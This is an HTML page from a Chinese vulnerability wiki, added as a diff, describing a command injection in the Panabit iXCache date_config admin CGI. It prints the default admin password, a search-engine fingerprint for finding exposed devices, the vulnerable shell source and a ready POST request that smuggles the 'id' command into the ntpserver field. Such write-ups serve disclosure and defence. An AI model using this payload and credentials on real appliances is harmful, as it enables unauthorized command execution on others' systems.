@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/Panabit%20iXCache%20date_config%20%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Panabit iXCache date_config 后台命令执行漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Panabit iXCache date_config \u540e\u53f0\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
+              {title: "\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u7f51\u7edc\u6d4b\u7ed8", url: "#_3" },
+              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_4" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../js/base.js"></script>
+      <script src="../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Sapido%20%E5%A4%9A%E6%AC%BE%E8%B7%AF%E7%94%B1%E5%99%A8%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Sapido%20%E5%A4%9A%E6%AC%BE%E8%B7%AF%E7%94%B1%E5%99%A8%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Sapido 多款路由器 远程命令执行漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Panabit%20Panalog%20sy_addmount.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Panabit%20Panalog%20sy_addmount.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Panabit Panalog sy_addmount.php 远程命令执行漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="panabit-ixcache-date_config">Panabit iXCache date_config 后台命令执行漏洞<a class="headerlink" href="#panabit-ixcache-date_config" title="Permanent link">&para;</a></h1>
+<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>Panabit iXCache date_config模块存在命令拼接，导致可执行任意命令</p>
+<h2 id="_2">漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>Panabit iXCache
+</code></pre></div>
+<h2 id="_3">网络测绘<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>title=&quot;iXCache&quot;
+</code></pre></div>
+<h2 id="_4">漏洞复现<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<p>登录页面</p>
+<p><img alt="image-20230314084931046" src="../images/image-20230314084931046.png" /></p>
+<p>默认账号密码为：admin/ixcache , 存在漏洞的模块为</p>
+<div class="highlight"><pre><span></span><code>/cgi-bin/Maintain/date_config
+</code></pre></div>
+<p>找到请求方式传参可以通过查看登陆页面文件获取, 通过抓包得知验证文件为 userverify.cgi</p>
+<p><img alt="image-20230314085003951" src="../images/image-20230314085003951.png" /></p>
+<p>接收请求参数的方式如下，通过快速搜索查找可能交互的地方</p>
+<div class="highlight"><pre><span></span><code>&quot;${REQUEST_METHOD}&quot; = &quot;POST&quot;
+</code></pre></div>
+<p><img alt="image-20230314085018386" src="../images/image-20230314085018386.png" /></p>
+<p>这样就可以快速找到可以传参交互的地方，查看的过程发现存在可控点</p>
+<p><img alt="image-20230314085054479" src="../images/image-20230314085054479.png" /></p>
+<div class="highlight"><pre><span></span><code>#!/bin/sh
+#This script is created by ssparser automatically. The parser first created by MaoShouyan
+printf &quot;Content-type: text/html
+Cache-Control: no-cache
+
+&quot;
+echo -n &quot;&quot;; 
+. ../common/common.sh
+myself=&quot;/cgi-bin/Maintain/`basename $0`&quot;
+
+echo -n &quot;
+&lt;script languate=\&quot;javascript\&quot;&gt;
+function Validate(frm)
+{
+    frm.ntpserver.value = TrimAll(frm.ntpserver.value);
+    if (frm.ntpserver.value != \&quot;\&quot; &amp;&amp; !IsIPAddr(frm.ntpserver.value)) {
+        alert(\&quot;请输入IP地址!\&quot;);
+        frm.ntpserver.select();
+        return false;
+    }
+    return true;
+}
+&lt;/script&gt;
+&quot;;
+if [ &quot;${REQUEST_METHOD}&quot; = &quot;POST&quot; ]; then
+    operator_check &quot;${myself}&quot;
+    [ &quot;${CGI_ntpserver}&quot; = &quot;&quot; ] &amp;&amp; CGI_ntpserver=&quot;0.0.0.0&quot;
+    echo &quot;ntpserver_ip=${CGI_ntpserver}&quot; &gt; ${PGETC}/ntp.conf
+    timefmt=&quot;${CGI_year}${CGI_month}${CGI_day}${CGI_hour}${CGI_minute}.${CGI_second}&quot;
+    errmsg=`date ${timefmt}`
+    [ &quot;${CGI_ntpserver}&quot; != &quot;0.0.0.0&quot; ] &amp;&amp; ntpdate -t 10 ${CGI_ntpserver}
+
+    afm_dialog_msg &quot;操作成功!&quot;
+fi
+year=`date &quot;+%Y&quot;`
+month=`date &quot;+%m&quot;`
+day=`date &quot;+%d&quot;`
+hour=`date &quot;+%H&quot;`
+minute=`date &quot;+%M&quot;`
+second=`date &quot;+%S&quot;`
+if [ -f ${PGETC}/ntp.conf ]; then
+    . ${PGETC}/ntp.conf
+    CGI_ntpserver=&quot;${ntpserver_ip}&quot;
+fi
+[ &quot;${CGI_ntpserver}&quot; = &quot;&quot; ] &amp;&amp; CGI_ntpserver=&quot;0.0.0.0&quot;
+
+echo -n &quot;
+&lt;body&gt;
+&quot;; cgi_show_title &quot;系统管理-&gt;系统时间&quot; 
+echo -n &quot;
+&lt;br&gt;
+&lt;form method=post onsubmit=\&quot;return Validate(this)\&quot; action=\&quot;${myself}\&quot;&gt;
+&lt;table width=700 border=0 cellspacing=1 cellpadding=1 bgcolor=\&quot;#ffffff\&quot;&gt;
+&lt;tr id=row1 height=22&gt;
+    &lt;td width=40&gt;&lt;/td&gt;
+    &lt;td width=90 align=left&gt;NTP服务器&lt;/td&gt;
+    &lt;td width=* align=left&gt;
+        &lt;input type=text name=ntpserver style=\&quot;width:120px\&quot; value=\&quot;${CGI_ntpserver}\&quot;&gt;&lt;/input&gt;&amp;nbsp;(请输入IP地址，目前不支持域名解析,0.0.0.0表示关闭NTP)&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/table&gt;
+&lt;br&gt;
+&lt;table width=700 border=0 cellspacing=1 cellpadding=1 bgcolor=\&quot;#ffffff\&quot;&gt;
+&lt;tr id=row1 height=22&gt;
+    &lt;td width=40&gt;&lt;/td&gt;
+    &lt;td width=90 align=left&gt;年/月/日&lt;/td&gt;
+    &lt;td width=* align=left&gt;
+    &lt;select name=year style=\&quot;width:60px\&quot; value=${year}&gt;
+    &quot;;
+        tmpvar=2000
+        while [ ${tmpvar} -le 2020 ]; do
+            if [ ${tmpvar} -eq ${year} ]; then
+                echo &quot;&lt;option value=${tmpvar} selected&gt;${tmpvar}&lt;/option&gt;&quot;
+            else
+                echo &quot;&lt;option value=${tmpvar}&gt;${tmpvar}&lt;/option&gt;&quot;
+            fi
+            tmpvar=$((${tmpvar} + 1))
+        done
+
+echo -n &quot;&lt;/select&gt;年
+    &lt;select name=month style=\&quot;width:60px\&quot; value=${month}&gt;
+    &quot;;
+        tmpvar=1
+        while [ ${tmpvar} -le 12 ]; do
+            selected=&quot;&quot;
+            [ ${tmpvar} -eq ${month} ] &amp;&amp; selected=&quot;selected&quot;
+            if [ ${tmpvar} -lt 10 ]; then
+                echo &quot;&lt;option value=\&quot;0${tmpvar}\&quot; ${selected}&gt;${tmpvar}&lt;/option&gt;&quot;
+            else
+                echo &quot;&lt;option value=\&quot;${tmpvar}\&quot; ${selected}&gt;${tmpvar}&lt;/option&gt;&quot;
+            fi
+            tmpvar=$((${tmpvar} + 1))
+        done
+
+echo -n &quot;&lt;/select&gt;月
+    &lt;select name=day style=\&quot;width:60px\&quot; value=${day}&gt;
+    &quot;;
+        tmpvar=1
+        while [ ${tmpvar} -le 31 ]; do
+            selected=&quot;&quot;
+            [ ${tmpvar} -eq ${day} ] &amp;&amp; selected=&quot;selected&quot;
+            if [ ${tmpvar} -lt 10 ]; then
+                echo &quot;&lt;option value=\&quot;0${tmpvar}\&quot; ${selected}&gt;${tmpvar}&lt;/option&gt;&quot;
+            else
+                echo &quot;&lt;option value=\&quot;${tmpvar}\&quot; ${selected}&gt;${tmpvar}&lt;/option&gt;&quot;
+            fi
+            tmpvar=$((${tmpvar} + 1))
+        done
+
+echo -n &quot;&lt;/select&gt;日&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr id=row1&gt;
+    &lt;td&gt;&lt;/td&gt;
+    &lt;td align=left&gt;时/分/秒&lt;/td&gt;
+    &lt;td width=* align=left&gt;
+    &lt;select name=hour value=0 style=\&quot;width:60px\&quot; value=${hour}&gt;
+    &quot;;
+        tmpvar=0
+        while [ ${tmpvar} -le 23 ]; do
+            selected=&quot;&quot;
+            [ ${tmpvar} -eq ${hour} ] &amp;&amp; selected=&quot;selected&quot;
+            if [ ${tmpvar} -lt 10 ]; then
+                echo &quot;&lt;option value=\&quot;0${tmpvar}\&quot; ${selected}&gt;${tmpvar}&lt;/option&gt;&quot;
+            else
+                echo &quot;&lt;option value=\&quot;${tmpvar}\&quot; ${selected}&gt;${tmpvar}&lt;/option&gt;&quot;
+            fi
+            tmpvar=$((${tmpvar} + 1))
+        done
+
+echo -n &quot;&lt;/select&gt;时
+    &lt;select name=minute value=0 style=\&quot;width:60px\&quot; value=${minute}&gt;
+    &quot;;
+        tmpvar=0
+        while [ ${tmpvar} -le 59 ]; do
+            selected=&quot;&quot;
+            [ ${tmpvar} -eq ${minute} ] &amp;&amp; selected=&quot;selected&quot;
+            if [ ${tmpvar} -lt 10 ]; then
+                echo &quot;&lt;option value=\&quot;0${tmpvar}\&quot; ${selected}&gt;${tmpvar}&lt;/option&gt;&quot;
+            else
+                echo &quot;&lt;option value=\&quot;${tmpvar}\&quot; ${selected}&gt;${tmpvar}&lt;/option&gt;&quot;
+            fi
+            tmpvar=$((${tmpvar} + 1))
+        done
+
+echo -n &quot;&lt;/select&gt;分
+    &lt;select name=second value=0 style=\&quot;width:60px\&quot; value=${second}&gt;
+    &quot;;
+        tmpvar=0
+        while [ ${tmpvar} -le 59 ]; do
+            selected=&quot;&quot;
+            [ ${tmpvar} -eq ${second} ] &amp;&amp; selected=&quot;selected&quot;
+            if [ ${tmpvar} -lt 10 ]; then
+                echo &quot;&lt;option value=\&quot;0${tmpvar}\&quot; ${selected}&gt;${tmpvar}&lt;/option&gt;&quot;
+            else
+                echo &quot;&lt;option value=\&quot;${tmpvar}\&quot; ${selected}&gt;${tmpvar}&lt;/option&gt;&quot;
+            fi
+            tmpvar=$((${tmpvar} + 1))
+        done
+
+echo -n &quot;&lt;/select&gt;秒&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/table&gt;
+&lt;table style=\&quot;width:700; border-bottom:1px #787882 solid; color:#0000ff\&quot;&gt;
+&lt;tr&gt;&lt;td align=right&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+&lt;/table&gt;
+&lt;table style=\&quot;width:700\&quot;&gt; 
+&lt;tr&gt;
+        &lt;td align=right&gt;&lt;input type=submit style=\&quot;width:70\&quot; value=\&quot;提交\&quot;&gt;&lt;/input&gt;
+    &lt;input type=hidden name=ifname value=\&quot;fxp1\&quot;&gt;&lt;/input&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/table&gt;
+&lt;/form&gt;
+&lt;/table&gt;
+&lt;/center&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+&quot;;
+</code></pre></div>
+<p><img alt="image-20230314085113258" src="../images/image-20230314085113258.png" /></p>
+<p>${CGI_ntpserver} 参数可以发现，受用户可控</p>
+<p><img alt="image-20230314085129884" src="../images/image-20230314085129884.png" /></p>
+<p>主要位置注意这个代码位置</p>
+<div class="highlight"><pre><span></span><code>echo &quot;ntpserver_ip=${CGI_ntpserver}&quot; &gt; ${PGETC}/ntp.conf
+</code></pre></div>
+<p>这里将参数写入 PGETC/ntp.conf 文件，查看文件位置，看一下变量 {PGETC} 配置</p>
+<p><img alt="image-20230314085219275" src="../images/image-20230314085219275.png" /></p>
+<p>在 /etc 目录下找到了这个文件</p>
+<p><img alt="image-20230314085232050" src="../images/image-20230314085232050.png" /></p>
+<p>继续向下看</p>
+<p><img alt="image-20230314085244308" src="../images/image-20230314085244308.png" /></p>
+<p>可以发现当 ntp.conf 文件中写入其他参数就会造成命令执行，思路如下</p>
+<p><img alt="image-20230314085259742" src="../images/image-20230314085259742.png" /></p>
+<p>构造请求</p>
+<div class="highlight"><pre><span></span><code>POST /cgi-bin/Maintain/date_config
+
+ntpserver=0.0.0.0;id&amp;year=2021&amp;month=08&amp;day=14&amp;hour=17&amp;minute=04&amp;second=50&amp;tz=Asiz&amp;bcy=Shanghai&amp;ifname=fxp1
+</code></pre></div>
+<p><img alt="image-20230314085313769" src="../images/image-20230314085313769.png" /></p>
+<p>成功写入 ntp.conf 文件为 0.0.0.0;id, 再次访问该页面就可以获取命令执行结果</p>
+<p><img alt="image-20230314085338637" src="../images/image-20230314085338637.png" /></p>
+<p>交互处可进行命令拼接造成注入</p>
+<p><img alt="image-20230314085353610" src="../images/image-20230314085353610.png" /></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Sapido%20%E5%A4%9A%E6%AC%BE%E8%B7%AF%E7%94%B1%E5%99%A8%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Sapido%20%E5%A4%9A%E6%AC%BE%E8%B7%AF%E7%94%B1%E5%99%A8%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Sapido 多款路由器 远程命令执行漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Panabit%20Panalog%20sy_addmount.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Panabit%20Panalog%20sy_addmount.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Panabit Panalog sy_addmount.php 远程命令执行漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
